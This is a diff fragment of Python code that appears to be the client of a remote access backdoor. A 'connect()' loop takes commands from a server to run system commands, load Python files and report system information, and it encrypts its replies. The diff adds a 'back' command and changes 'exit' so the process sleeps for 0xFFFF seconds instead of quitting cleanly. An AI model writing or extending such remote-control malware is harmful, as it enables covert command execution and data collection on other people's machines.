@@ -63,13 +63,15 @@ def connect():
             run [System Command]
             settimeout [Time]
             load [Python File Path]
+            back
             """
             server.send(enctry(help,md5).encode())
         elif 'exit' in cmd:
             server.send(enctry('Goodbye.8)',md5).encode())
-            time.sleep(0.3)
+            time.sleep(0.2)
             server.close()
-            sys.exit()
+            time.sleep(0xFFFF)
+            exit()
         elif 'sysinfo' in cmd:
             content = """"""
             content += "Platform: " + str(platform.architecture()) + '\n'
